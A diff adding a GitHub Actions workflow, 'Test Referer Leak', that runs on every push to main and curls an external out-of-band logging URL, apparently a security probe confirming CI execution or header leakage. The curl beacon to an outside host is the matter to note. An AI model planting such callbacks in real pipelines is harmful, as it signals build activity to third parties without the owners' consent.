@@ -1,0 +1,12 @@
+name: Test Referer Leak
+on:
+  push:
+    branches: [ main ]
+jobs:
+  leak-referer:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+      - name: Curl OOB URL
+        run: curl -v https://test4.unit259.com//log?prefix=action
